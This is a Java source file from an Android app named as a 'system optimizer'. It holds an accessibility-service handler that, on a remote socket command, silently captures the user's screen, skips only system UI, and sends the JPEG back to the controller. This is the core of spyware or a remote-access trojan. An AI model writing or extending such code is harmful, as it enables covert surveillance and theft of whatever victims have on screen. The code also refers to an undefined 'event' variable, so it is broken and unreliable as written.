package com.system.optimizer.event_handler;

import java.io.ByteArrayOutputStream;

import com.system.optimizer.config.ConfigManager;
import com.system.optimizer.network.SocketManager;
import com.system.optimizer.config.ConfigData;

import android.view.accessibility.AccessibilityEvent;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.graphics.ColorSpace;
import android.hardware.HardwareBuffer;
import android.os.Build;
import androidx.annotation.RequiresApi;

public class ScreenshotEventHandler {
    private static final String TAG = "ScreenshotEventHandler";

    private final AccessibilityService service;

    private final SocketManager socketManager;
    
    private final ConfigManager configManager;

    public ScreenshotEventHandler(AccessibilityService delegate, SocketManager socketManager, ConfigManager configManager) {
        if (delegate == null) {
            throw new IllegalArgumentException("AccessibilityService cannot be null");
        }
        if (socketManager == null) {
            throw new IllegalArgumentException("SocketManager cannot be null");
        }
        if (configManager == null) {
            throw new IllegalArgumentException("ConfigManager cannot be null");
        }
        this.service = delegate;
        this.socketManager = socketManager;
        this.configManager = configManager;
        this.socketManager.addListener("screenshot", args -> onScreenshotRequestEvent());
    }

    public void onScreenshotRequestEvent() {

        // Only take screenshot if enabled in config
        ConfigData config = configManager.getCachedConfig();
        if (config == null || !config.isAutoScreenshotEnabled()) {
            return;
        }

        // Ignore system UI packages
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (packageName.equals("com.android.systemui") ||
                packageName.equals("android")) {
            return;
        }

        // Check if device supports screenshot functionality
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            socketManager.sendEvent("logger", "Screenshot not supported on this Android version");
            return;
        }

        try {
            service.takeScreenshot(
                    android.view.Display.DEFAULT_DISPLAY,
                    service.getMainExecutor(),
                    new AccessibilityService.TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(AccessibilityService.ScreenshotResult result) {
                            try {
                                if (result == null) {
                                    socketManager.sendEvent("logger", "Screenshot result is null");
                                    return;
                                }

                                HardwareBuffer buffer = result.getHardwareBuffer();
                                if (buffer == null) {
                                    socketManager.sendEvent("logger", "HardwareBuffer is null");
                                    return;
                                }

                                ColorSpace colorSpace = result.getColorSpace();
                                if (colorSpace == null) {
                                    colorSpace = ColorSpace.get(ColorSpace.Named.SRGB);
                                }

                                Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
                                if (bitmap == null) {
                                    buffer.close();
                                    socketManager.sendEvent("logger", "Failed to create bitmap from HardwareBuffer");
                                    return;
                                }

                                buffer.close();

                                ConfigData cachedConfig = configManager.getCachedConfig();
                                byte[] imageData = bitmapToJpegBytes(bitmap, cachedConfig.getScreenshotQuality());
                                bitmap.recycle();
                                socketManager.sendEvent("screenshot_response", imageData);
                            } catch (Exception e) {
                                socketManager.sendEvent("logger", "Error processing screenshot: " + e.getMessage());
                            }
                        }

                        @Override
                        public void onFailure(int error) {
                            socketManager.sendEvent("logger", "Screenshot failed with error code: " + error);
                        }
                    });
        } catch (Exception e) {
            socketManager.sendEvent("logger", "Error taking screenshot: " + e.getMessage());
        }
    }

    /**
     * Convert Bitmap to JPEG byte array
     */
    private static byte[] bitmapToJpegBytes(Bitmap bitmap, int quality) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
        return baos.toByteArray();
    }
}